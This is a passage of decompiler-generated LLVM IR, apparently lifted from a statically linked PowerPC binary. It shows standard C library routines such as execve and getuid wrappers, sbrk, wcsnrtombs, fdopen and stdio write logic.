  %v0_10020c00 = call i32 @__asm_mfcr()
  %v1_10020c04 = and i32 %v0_10020c00, 268435456
  %v3_10020c04 = icmp eq i32 %v1_10020c04, 0
  store i32 %v0_10020c00, i32* %r31.global-to-local, align 4
  br i1 %v3_10020c04, label %dec_label_pc_10020c1c, label %dec_label_pc_10020c10

dec_label_pc_10020c10:                            ; preds = %entry
  %v0_10020c10 = call i32 @__errno_location()
  %v0_10020c14 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020c14 = inttoptr i32 %v0_10020c10 to i32*
  store i32 %v0_10020c14, i32* %v2_10020c14, align 4
  br label %dec_label_pc_10020c1c

dec_label_pc_10020c1c:                            ; preds = %entry, %dec_label_pc_10020c10
  %v0_10020c2c = phi i32 [ %v0_10020c00, %entry ], [ -1, %dec_label_pc_10020c10 ]
  ret i32 %v0_10020c2c

; uselistorder directives
  uselistorder label %dec_label_pc_10020c1c, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020c48 = call i32 @__asm_mfcr()
  %v1_10020c4c = and i32 %v0_10020c48, 268435456
  %v3_10020c4c = icmp eq i32 %v1_10020c4c, 0
  store i32 %v0_10020c48, i32* %r31.global-to-local, align 4
  br i1 %v3_10020c4c, label %dec_label_pc_10020c64, label %dec_label_pc_10020c58

dec_label_pc_10020c58:                            ; preds = %entry
  %v0_10020c58 = call i32 @__errno_location()
  %v0_10020c5c = load i32, i32* %r31.global-to-local, align 4
  %v2_10020c5c = inttoptr i32 %v0_10020c58 to i32*
  store i32 %v0_10020c5c, i32* %v2_10020c5c, align 4
  br label %dec_label_pc_10020c64

dec_label_pc_10020c64:                            ; preds = %entry, %dec_label_pc_10020c58
  %v0_10020c74 = phi i32 [ %v0_10020c48, %entry ], [ -1, %dec_label_pc_10020c58 ]
  ret i32 %v0_10020c74

; uselistorder directives
  uselistorder label %dec_label_pc_10020c64, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020c90 = call i32 @__asm_mfcr()
  %v1_10020c94 = and i32 %v0_10020c90, 268435456
  %v3_10020c94 = icmp eq i32 %v1_10020c94, 0
  store i32 %v0_10020c90, i32* %r31.global-to-local, align 4
  br i1 %v3_10020c94, label %dec_label_pc_10020cac, label %dec_label_pc_10020ca0

dec_label_pc_10020ca0:                            ; preds = %entry
  %v0_10020ca0 = call i32 @__errno_location()
  %v0_10020ca4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020ca4 = inttoptr i32 %v0_10020ca0 to i32*
  store i32 %v0_10020ca4, i32* %v2_10020ca4, align 4
  br label %dec_label_pc_10020cac

dec_label_pc_10020cac:                            ; preds = %entry, %dec_label_pc_10020ca0
  %v0_10020cbc = phi i32 [ %v0_10020c90, %entry ], [ -1, %dec_label_pc_10020ca0 ]
  ret i32 %v0_10020cbc

; uselistorder directives
  uselistorder label %dec_label_pc_10020cac, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020cd8 = call i32 @__asm_mfcr()
  %v1_10020cdc = and i32 %v0_10020cd8, 268435456
  %v3_10020cdc = icmp eq i32 %v1_10020cdc, 0
  store i32 %v0_10020cd8, i32* %r31.global-to-local, align 4
  br i1 %v3_10020cdc, label %dec_label_pc_10020cf4, label %dec_label_pc_10020ce8

dec_label_pc_10020ce8:                            ; preds = %entry
  %v0_10020ce8 = call i32 @__errno_location()
  %v0_10020cec = load i32, i32* %r31.global-to-local, align 4
  %v2_10020cec = inttoptr i32 %v0_10020ce8 to i32*
  store i32 %v0_10020cec, i32* %v2_10020cec, align 4
  br label %dec_label_pc_10020cf4

dec_label_pc_10020cf4:                            ; preds = %entry, %dec_label_pc_10020ce8
  %v0_10020d04 = phi i32 [ %v0_10020cd8, %entry ], [ -1, %dec_label_pc_10020ce8 ]
  ret i32 %v0_10020d04

; uselistorder directives
  uselistorder label %dec_label_pc_10020cf4, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020d20 = call i32 @__asm_mfcr()
  %v1_10020d24 = and i32 %v0_10020d20, 268435456
  %v3_10020d24 = icmp eq i32 %v1_10020d24, 0
  store i32 %v0_10020d20, i32* %r31.global-to-local, align 4
  br i1 %v3_10020d24, label %dec_label_pc_10020d3c, label %dec_label_pc_10020d30

dec_label_pc_10020d30:                            ; preds = %entry
  %v0_10020d30 = call i32 @__errno_location()
  %v0_10020d34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020d34 = inttoptr i32 %v0_10020d30 to i32*
  store i32 %v0_10020d34, i32* %v2_10020d34, align 4
  br label %dec_label_pc_10020d3c

dec_label_pc_10020d3c:                            ; preds = %entry, %dec_label_pc_10020d30
  %v0_10020d4c = phi i32 [ %v0_10020d20, %entry ], [ -1, %dec_label_pc_10020d30 ]
  ret i32 %v0_10020d4c

; uselistorder directives
  uselistorder i32 268435456, { 39, 40, 41, 26, 18, 4, 38, 37, 44, 27, 31, 46, 47, 16, 22, 30, 42, 12, 14, 15, 11, 13, 28, 29, 23, 5, 49, 43, 10, 6, 7, 17, 9, 36, 48, 34, 24, 19, 33, 52, 8, 32, 35, 45, 50, 51, 53, 0, 20, 1, 21, 2, 3, 25 }
  uselistorder label %dec_label_pc_10020d3c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_10020d6c = load i32, i32* @global_var_1004528c.1284, align 4
  %v3_10020d70 = icmp eq i32 %v3_10020d6c, 0
  br i1 %v3_10020d70, label %dec_label_pc_10020d78, label %dec_label_pc_10020d84

dec_label_pc_10020d78:                            ; preds = %entry
  store i32 268569980, i32* @lr, align 4
  %v1_10020d78 = call i32 @__GI_brk(i32 0)
  %v1_10020d7c = icmp slt i32 %v1_10020d78, 0
  br i1 %v1_10020d7c, label %dec_label_pc_10020dac, label %dec_label_pc_10020d78.dec_label_pc_10020d84_crit_edge

dec_label_pc_10020d78.dec_label_pc_10020d84_crit_edge: ; preds = %dec_label_pc_10020d78
  %v0_10020d84.pre = load i32, i32* @r30, align 4
  %v3_10020d88.pre = load i32, i32* @global_var_1004528c.1284, align 4
  br label %dec_label_pc_10020d84

dec_label_pc_10020d84:                            ; preds = %dec_label_pc_10020d78.dec_label_pc_10020d84_crit_edge, %entry
  %v3_10020d88 = phi i32 [ %v3_10020d88.pre, %dec_label_pc_10020d78.dec_label_pc_10020d84_crit_edge ], [ %v3_10020d6c, %entry ]
  %v1_10020d9c = phi i32 [ %v0_10020d84.pre, %dec_label_pc_10020d78.dec_label_pc_10020d84_crit_edge ], [ %arg1, %entry ]
  %v3_10020d84 = icmp eq i32 %v1_10020d9c, 0
  store i32 %v3_10020d88, i32* @r31, align 4
  br i1 %v3_10020d84, label %dec_label_pc_10020db0, label %dec_label_pc_10020d98

dec_label_pc_10020d98:                            ; preds = %dec_label_pc_10020d84
  %v2_10020d9c = add i32 %v1_10020d9c, %v3_10020d88
  store i32 268570020, i32* @lr, align 4
  %v1_10020da0 = call i32 @__GI_brk(i32 %v2_10020d9c)
  %tmp6 = icmp sgt i32 %v1_10020da0, -1
  br i1 %tmp6, label %dec_label_pc_10020d98.dec_label_pc_10020db0_crit_edge, label %dec_label_pc_10020dac

dec_label_pc_10020d98.dec_label_pc_10020db0_crit_edge: ; preds = %dec_label_pc_10020d98
  %v0_10020db4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10020db0

dec_label_pc_10020dac:                            ; preds = %dec_label_pc_10020d98, %dec_label_pc_10020d78
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10020db0

dec_label_pc_10020db0:                            ; preds = %dec_label_pc_10020d98.dec_label_pc_10020db0_crit_edge, %dec_label_pc_10020d84, %dec_label_pc_10020dac
  %v0_10020db4 = phi i32 [ %v0_10020db4.pre, %dec_label_pc_10020d98.dec_label_pc_10020db0_crit_edge ], [ %v3_10020d88, %dec_label_pc_10020d84 ], [ -1, %dec_label_pc_10020dac ]
  ret i32 %v0_10020db4

; uselistorder directives
  uselistorder i32 %v3_10020d88, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_10020db0, { 2, 0, 1 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10020dc8 = add i32 %arg1, 128
  %v1_10020dcc = mul i32 %arg1, 2
  %v2_10020dd0 = icmp ugt i32 %v1_10020dc8, 383
  %v0_10020dd4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10020dd0, i32 %v0_10020dd4)
  %v3_10020ddc = load i32, i32* bitcast (i32** @global_var_10045144.1185 to i32*), align 4
  %v2_10020de0 = add i32 %v1_10020dcc, %v3_10020ddc
  %v3_10020de0 = inttoptr i32 %v2_10020de0 to i16*
  %v4_10020de0 = load i16, i16* %v3_10020de0, align 2
  %v5_10020de0 = sext i16 %v4_10020de0 to i32
  ret i32 %v5_10020de0
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10045210.990 to i32)

; uselistorder directives
  uselistorder i32* @global_var_10045210.990, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10020dfc = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10020e10 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10020e10, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10020dfc, label %dec_label_pc_10020e1c, label %dec_label_pc_10020e24

dec_label_pc_10020e1c:                            ; preds = %entry
  %v2_10020e1c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10020e1c, i32* @r3, align 4
  br label %dec_label_pc_10020e24

dec_label_pc_10020e24:                            ; preds = %entry, %dec_label_pc_10020e1c
  %v0_10020e28 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_10020e1c ]
  %v2_10020e24 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_10020e28, i32* %stack_var_-40, align 4
  store i32 %v2_10020e24, i32* %stack_var_-36, align 4
  store i32 268570164, i32* @lr, align 4
  %v0_10020e30 = call i32 @__GI_wcsnrtombs()
  %v3_10020e34 = icmp eq i32 %v0_10020e30, 0
  br i1 %v3_10020e34, label %dec_label_pc_10020e3c, label %dec_label_pc_10020e40

dec_label_pc_10020e3c:                            ; preds = %dec_label_pc_10020e24
  br label %dec_label_pc_10020e40

dec_label_pc_10020e40:                            ; preds = %dec_label_pc_10020e24, %dec_label_pc_10020e3c
  %v0_10020e4c = phi i32 [ %v0_10020e30, %dec_label_pc_10020e24 ], [ 1, %dec_label_pc_10020e3c ]
  ret i32 %v0_10020e4c

; uselistorder directives
  uselistorder label %dec_label_pc_10020e40, { 1, 0 }
  uselistorder label %dec_label_pc_10020e24, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_10020e54 = load i32, i32* @r5, align 4
  store i32 %v0_10020e54, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10020e5c = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_10020e5c

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10020e64 = load i32, i32* @lr, align 4
  store i32 %v0_10020e64, i32* %r0.global-to-local, align 4
  %v0_10020e68 = load i32, i32* @r3, align 4
  %v3_10020e68 = icmp eq i32 %v0_10020e68, 0
  br i1 %v3_10020e68, label %dec_label_pc_10020e8c, label %dec_label_pc_10020e74

dec_label_pc_10020e74:                            ; preds = %entry
  %v1_10020e74 = load i32, i32* @r4, align 4
  %v4_10020e74 = icmp eq i32 %v0_10020e68, %v1_10020e74
  store i32 1, i32* @r10, align 4
  br i1 %v4_10020e74, label %dec_label_pc_10020e80, label %dec_label_pc_10020eb8

dec_label_pc_10020e80:                            ; preds = %dec_label_pc_10020e74
  %v2_10020e84 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10020e84, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  br label %dec_label_pc_10020eb8

dec_label_pc_10020e8c:                            ; preds = %entry
  %v2_10020e8411 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10020e8411, i32* @r3, align 4
  store i32 0, i32* @r10, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10020eb8

dec_label_pc_10020e98:                            ; preds = %dec_label_pc_10020ef8.dec_label_pc_10020ed8_crit_edge, %dec_label_pc_10020ed8.preheader
  %v0_10020e98 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10020ea4 = inttoptr i32 %v0_10020e98 to i32*
  store i32 84, i32* %v2_10020ea4, align 4
  %v0_10020f1c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10020f18

dec_label_pc_10020eac:                            ; preds = %dec_label_pc_10020ee8
  store i32 0, i32* @r11, align 4
  %v0_10020f08.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10020f04

dec_label_pc_10020eb8:                            ; preds = %dec_label_pc_10020e80, %dec_label_pc_10020e74, %dec_label_pc_10020e8c
  %v2_10020ee87 = phi i32 [ %v2_10020e84, %dec_label_pc_10020e80 ], [ %v0_10020e68, %dec_label_pc_10020e74 ], [ %v2_10020e8411, %dec_label_pc_10020e8c ]
  %v0_10020eb8 = load i32, i32* @r5, align 4
  %v1_10020eb8 = load i32, i32* @r6, align 4
  %v3_10020eb8 = icmp ugt i32 %v0_10020eb8, %v1_10020eb8
  br i1 %v3_10020eb8, label %dec_label_pc_10020ec0, label %dec_label_pc_10020ec4

dec_label_pc_10020ec0:                            ; preds = %dec_label_pc_10020eb8
  store i32 %v1_10020eb8, i32* @r5, align 4
  br label %dec_label_pc_10020ec4

dec_label_pc_10020ec4:                            ; preds = %dec_label_pc_10020eb8, %dec_label_pc_10020ec0
  %v0_10020ed0 = phi i32 [ %v0_10020eb8, %dec_label_pc_10020eb8 ], [ %v1_10020eb8, %dec_label_pc_10020ec0 ]
  %v1_10020ec4 = add i32 %v0_10020ed0, 1
  store i32 %v1_10020ec4, i32* %r0.global-to-local, align 4
  %v0_10020ec8 = load i32, i32* @r4, align 4
  %v1_10020ec8 = inttoptr i32 %v0_10020ec8 to i32*
  %v2_10020ec8 = load i32, i32* %v1_10020ec8, align 4
  store i32 %v2_10020ec8, i32* @r11, align 4
  store i32 %v0_10020ed0, i32* %r9.global-to-local, align 4
  store i32 %v0_10020ed0, i32* %ctr.global-to-local, align 4
  %v2_10020f003 = icmp eq i32 %v0_10020ed0, 0
  br i1 %v2_10020f003, label %dec_label_pc_10020f04, label %dec_label_pc_10020ed8.preheader

dec_label_pc_10020ed8.preheader:                  ; preds = %dec_label_pc_10020ec4
  %v1_10020ed816 = inttoptr i32 %v2_10020ec8 to i32*
  %v2_10020ed817 = load i32, i32* %v1_10020ed816, align 4
  store i32 %v2_10020ed817, i32* %r0.global-to-local, align 4
  %v1_10020edc18 = add i32 %v2_10020ec8, 4
  store i32 %v1_10020edc18, i32* @r11, align 4
  %v2_10020ee020 = icmp ugt i32 %v2_10020ed817, 127
  br i1 %v2_10020ee020, label %dec_label_pc_10020e98, label %dec_label_pc_10020ee8.lr.ph

dec_label_pc_10020ee8.lr.ph:                      ; preds = %dec_label_pc_10020ed8.preheader
  %extract.t = trunc i32 %v2_10020ed817 to i8
  br label %dec_label_pc_10020ee8

dec_label_pc_10020ee8:                            ; preds = %dec_label_pc_10020ee8.lr.ph, %dec_label_pc_10020ef8.dec_label_pc_10020ed8_crit_edge
  %v2_10020ed823.off0 = phi i8 [ %extract.t, %dec_label_pc_10020ee8.lr.ph ], [ %extract.t24, %dec_label_pc_10020ef8.dec_label_pc_10020ed8_crit_edge ]
  %v2_10020ee822 = phi i32 [ %v2_10020ee87, %dec_label_pc_10020ee8.lr.ph ], [ %v2_10020ef8, %dec_label_pc_10020ef8.dec_label_pc_10020ed8_crit_edge ]
  %v3_10020ee8 = inttoptr i32 %v2_10020ee822 to i8*
  store i8 %v2_10020ed823.off0, i8* %v3_10020ee8, align 1
  %v0_10020eec = load i32, i32* %r0.global-to-local, align 4
  %v1_10020eec = urem i32 %v0_10020eec, 256
  store i32 %v1_10020eec, i32* %r0.global-to-local, align 4
  %v3_10020ef0 = icmp eq i32 %v1_10020eec, 0
  br i1 %v3_10020ef0, label %dec_label_pc_10020eac, label %dec_label_pc_10020ef8

dec_label_pc_10020ef8:                            ; preds = %dec_label_pc_10020ee8
  %v0_10020ef8 = load i32, i32* @r3, align 4
  %v1_10020ef8 = load i32, i32* @r10, align 4
  %v2_10020ef8 = add i32 %v1_10020ef8, %v0_10020ef8
  store i32 %v2_10020ef8, i32* @r3, align 4
  %v0_10020efc = load i32, i32* %r9.global-to-local, align 4
  %v1_10020efc = add i32 %v0_10020efc, -1
  store i32 %v1_10020efc, i32* %r9.global-to-local, align 4
  %v0_10020f00 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10020f00 = add i32 %v0_10020f00, -1
  store i32 %v1_10020f00, i32* %ctr.global-to-local, align 4
  %v2_10020f00 = icmp eq i32 %v1_10020f00, 0
  br i1 %v2_10020f00, label %dec_label_pc_10020f04, label %dec_label_pc_10020ef8.dec_label_pc_10020ed8_crit_edge

dec_label_pc_10020ef8.dec_label_pc_10020ed8_crit_edge: ; preds = %dec_label_pc_10020ef8
  %v0_10020ed8.pre = load i32, i32* @r11, align 4
  %v1_10020ed8 = inttoptr i32 %v0_10020ed8.pre to i32*
  %v2_10020ed8 = load i32, i32* %v1_10020ed8, align 4
  store i32 %v2_10020ed8, i32* %r0.global-to-local, align 4
  %v1_10020edc = add i32 %v0_10020ed8.pre, 4
  store i32 %v1_10020edc, i32* @r11, align 4
  %v2_10020ee0 = icmp ugt i32 %v2_10020ed8, 127
  %extract.t24 = trunc i32 %v2_10020ed8 to i8
  br i1 %v2_10020ee0, label %dec_label_pc_10020e98, label %dec_label_pc_10020ee8

dec_label_pc_10020f04:                            ; preds = %dec_label_pc_10020ef8, %dec_label_pc_10020ec4, %dec_label_pc_10020eac
  %v0_10020f08 = phi i32 [ %v0_10020f08.pre, %dec_label_pc_10020eac ], [ %v2_10020ee87, %dec_label_pc_10020ec4 ], [ %v2_10020ef8, %dec_label_pc_10020ef8 ]
  %v2_10020f04 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10020f04, i32* %r0.global-to-local, align 4
  %v4_10020f08 = icmp eq i32 %v0_10020f08, %v2_10020f04
  br i1 %v4_10020f08, label %dec_label_pc_10020f14, label %dec_label_pc_10020f10

dec_label_pc_10020f10:                            ; preds = %dec_label_pc_10020f04
  %v0_10020f10 = load i32, i32* @r11, align 4
  %v1_10020f10 = load i32, i32* @r4, align 4
  %v2_10020f10 = inttoptr i32 %v1_10020f10 to i32*
  store i32 %v0_10020f10, i32* %v2_10020f10, align 4
  br label %dec_label_pc_10020f14

dec_label_pc_10020f14:                            ; preds = %dec_label_pc_10020f04, %dec_label_pc_10020f10
  %v0_10020f14 = load i32, i32* %r9.global-to-local, align 4
  %v1_10020f14 = load i32, i32* @r5, align 4
  %v2_10020f14 = sub i32 %v1_10020f14, %v0_10020f14
  store i32 %v2_10020f14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10020f18

dec_label_pc_10020f18:                            ; preds = %dec_label_pc_10020e98, %dec_label_pc_10020f14
  %v0_10020f1c = phi i32 [ %v0_10020f1c.pre, %dec_label_pc_10020e98 ], [ %v2_10020f14, %dec_label_pc_10020f14 ]
  store i32 %v0_10020e64, i32* %r0.global-to-local, align 4
  ret i32 %v0_10020f1c

; uselistorder directives
  uselistorder i32 %v1_10020f00, { 1, 0 }
  uselistorder i32 %v2_10020ef8, { 0, 2, 1 }
  uselistorder i32 %v1_10020eec, { 1, 0 }
  uselistorder i32 %v0_10020ed0, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10020ee87, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10020f18, { 1, 0 }
  uselistorder label %dec_label_pc_10020f14, { 1, 0 }
  uselistorder label %dec_label_pc_10020ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10020ec4, { 1, 0 }
  uselistorder label %dec_label_pc_10020eb8, { 2, 0, 1 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_10020f30 = load i32, i32* @lr, align 4
  store i32 268570448, i32* @lr, align 4
  %v2_10020f4c = call i32 @__libc_fcntl(i32 3, i32 3)
  %v3_10020f50 = icmp eq i32 %v2_10020f4c, -1
  store i32 %arg1, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br i1 %v3_10020f50, label %dec_label_pc_10020f78, label %dec_label_pc_10020f64

dec_label_pc_10020f64:                            ; preds = %entry
  store i32 %v0_10020f30, i32* @lr, align 4
  %v4_10020f74 = inttoptr i32 %arg2 to i8*
  %v5_10020f74 = call i32 @_stdio_fopen(i32 %v2_10020f4c, i8* %v4_10020f74)
  br label %dec_label_pc_10020f78

dec_label_pc_10020f78:                            ; preds = %entry, %dec_label_pc_10020f64
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10020f78, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10020f94 = load i32, i32* @lr, align 4
  store i32 %v0_10020f94, i32* %r0.global-to-local, align 4
  %v0_10020fa0 = load i32, i32* @r5, align 4
  store i32 %v0_10020fa0, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10020fa0, i32* @r31, align 4
  %v3_10020fb03 = icmp eq i32 %v0_10020fa0, 0
  br i1 %v3_10020fb03, label %dec_label_pc_10021058, label %dec_label_pc_10020fbc

dec_label_pc_10020fbc:                            ; preds = %entry, %dec_label_pc_10020fe0
  %v0_10020fd0 = phi i32 [ %v2_10020fe0, %dec_label_pc_10020fe0 ], [ %arg2, %entry ]
  %v0_10020fbc = phi i32 [ %v2_10020fe4, %dec_label_pc_10020fe0 ], [ %v0_10020fa0, %entry ]
  %v1_10020fc0.in = phi i32 [ %v2_10020fe4, %dec_label_pc_10020fe0 ], [ %v0_10020fa0, %entry ]
  %v1_10020fc0 = icmp sgt i32 %v1_10020fc0.in, 0
  store i32 %v0_10020fbc, i32* @r27, align 4
  br i1 %v1_10020fc0, label %dec_label_pc_10020fcc, label %dec_label_pc_10020fc4

dec_label_pc_10020fc4:                            ; preds = %dec_label_pc_10020fbc
  br label %dec_label_pc_10020fcc

dec_label_pc_10020fcc:                            ; preds = %dec_label_pc_10020fbc, %dec_label_pc_10020fc4
  %v0_10020fcc = load i32, i32* @r30, align 4
  %v1_10020fcc = add i32 %v0_10020fcc, 4
  %v2_10020fcc = inttoptr i32 %v1_10020fcc to i32*
  %v3_10020fcc = load i32, i32* %v2_10020fcc, align 4
  store i32 268570584, i32* @lr, align 4
  %v3_10020fd4 = call i32 @__libc_write(i32 %v3_10020fcc, i32 %v0_10020fd0)
  %v1_10020fd8 = icmp slt i32 %v3_10020fd4, 0
  br i1 %v1_10020fd8, label %dec_label_pc_10020fec, label %dec_label_pc_10020fe0

dec_label_pc_10020fe0:                            ; preds = %dec_label_pc_10020fcc
  %v0_10020fe0 = load i32, i32* @r29, align 4
  %v2_10020fe0 = add i32 %v0_10020fe0, %v3_10020fd4
  store i32 %v2_10020fe0, i32* @r29, align 4
  %v1_10020fe4 = load i32, i32* @r31, align 4
  %v2_10020fe4 = sub i32 %v1_10020fe4, %v3_10020fd4
  store i32 %v2_10020fe4, i32* @r31, align 4
  %v3_10020fb0 = icmp eq i32 %v2_10020fe4, 0
  br i1 %v3_10020fb0, label %dec_label_pc_10020fb0.dec_label_pc_10021058.loopexit_crit_edge, label %dec_label_pc_10020fbc

dec_label_pc_10020fec:                            ; preds = %dec_label_pc_10020fcc
  %v0_10020fec = load i32, i32* @r30, align 4
  %v1_10020fec = add i32 %v0_10020fec, 8
  %v2_10020fec = inttoptr i32 %v1_10020fec to i32*
  %v3_10020fec = load i32, i32* %v2_10020fec, align 4
  store i32 %v3_10020fec, i32* @r11, align 4
  %v1_10020ff0 = add i32 %v0_10020fec, 12
  %v2_10020ff0 = inttoptr i32 %v1_10020ff0 to i32*
  %v3_10020ff0 = load i32, i32* %v2_10020ff0, align 4
  store i32 %v3_10020ff0, i32* %r0.global-to-local, align 4
  %v1_10020ff4 = inttoptr i32 %v0_10020fec to i16*
  %v2_10020ff4 = load i16, i16* %v1_10020ff4, align 2
  %v2_10020ff8 = sub i32 %v3_10020ff0, %v3_10020fec
  store i32 %v2_10020ff8, i32* %r0.global-to-local, align 4
  %v5_10020ff8 = icmp eq i32 %v2_10020ff8, 0
  %v1_10020ffc = or i16 %v2_10020ff4, 8
  store i16 %v1_10020ffc, i16* %v1_10020ff4, align 2
  br i1 %v5_10020ff8, label %dec_label_pc_10020fec.dec_label_pc_10021054_crit_edge, label %dec_label_pc_10021008

dec_label_pc_10020fec.dec_label_pc_10021054_crit_edge: ; preds = %dec_label_pc_10020fec
  %v0_10021054.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10021054

dec_label_pc_10021008:                            ; preds = %dec_label_pc_10020fec
  %v0_10021008 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021008 = load i32, i32* @r31, align 4
  %v3_10021008 = icmp ugt i32 %v0_10021008, %v1_10021008
  br i1 %v3_10021008, label %dec_label_pc_10021008.dec_label_pc_10021014_crit_edge, label %dec_label_pc_10021010

dec_label_pc_10021008.dec_label_pc_10021014_crit_edge: ; preds = %dec_label_pc_10021008
  %v0_10021014.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10021014

dec_label_pc_10021010:                            ; preds = %dec_label_pc_10021008
  store i32 %v0_10021008, i32* @r27, align 4
  br label %dec_label_pc_10021014

dec_label_pc_10021014:                            ; preds = %dec_label_pc_10021008.dec_label_pc_10021014_crit_edge, %dec_label_pc_10021010
  %v0_10021014 = phi i32 [ %v0_10021014.pre, %dec_label_pc_10021008.dec_label_pc_10021014_crit_edge ], [ %v0_10021008, %dec_label_pc_10021010 ]
  store i32 %v0_10021014, i32* %ctr.global-to-local, align 4
  %v2_10021020.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10021018

dec_label_pc_10021018:                            ; preds = %dec_label_pc_1002103c, %dec_label_pc_10021014
  %v2_10021020 = phi i32 [ %v1_1002103c, %dec_label_pc_1002103c ], [ %v2_10021020.pre, %dec_label_pc_10021014 ]
  %v0_10021018 = load i32, i32* @r29, align 4
  %v1_10021018 = inttoptr i32 %v0_10021018 to i8*
  %v2_10021018 = load i8, i8* %v1_10021018, align 1
  %v3_10021018 = zext i8 %v2_10021018 to i32
  store i32 %v3_10021018, i32* %r0.global-to-local, align 4
  %v1_1002101c = add i32 %v0_10021018, 1
  store i32 %v1_1002101c, i32* @r29, align 4
  %v3_10021020 = inttoptr i32 %v2_10021020 to i8*
  store i8 %v2_10021018, i8* %v3_10021020, align 1
  %v0_10021024 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021024 = urem i32 %v0_10021024, 256
  store i32 %v1_10021024, i32* %r0.global-to-local, align 4
  %v3_10021028 = icmp eq i32 %v1_10021024, 10
  br i1 %v3_10021028, label %dec_label_pc_10021030, label %dec_label_pc_1002103c

dec_label_pc_10021030:                            ; preds = %dec_label_pc_10021018
  %v0_10021030 = load i32, i32* @r30, align 4
  %v1_10021030 = inttoptr i32 %v0_10021030 to i16*
  %v2_10021030 = load i16, i16* %v1_10021030, align 2
  %v3_10021030 = zext i16 %v2_10021030 to i32
  store i32 %v3_10021030, i32* %r0.global-to-local, align 4
  %v1_10021034 = and i32 %v3_10021030, 256
  %v3_10021034 = icmp eq i32 %v1_10021034, 0
  br i1 %v3_10021034, label %dec_label_pc_1002103c, label %dec_label_pc_10021030.dec_label_pc_10021044_crit_edge

dec_label_pc_10021030.dec_label_pc_10021044_crit_edge: ; preds = %dec_label_pc_10021030
  %v0_10021048.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10021044

dec_label_pc_1002103c:                            ; preds = %dec_label_pc_10021030, %dec_label_pc_10021018
  %v0_1002103c = load i32, i32* @r11, align 4
  %v1_1002103c = add i32 %v0_1002103c, 1
  store i32 %v1_1002103c, i32* @r11, align 4
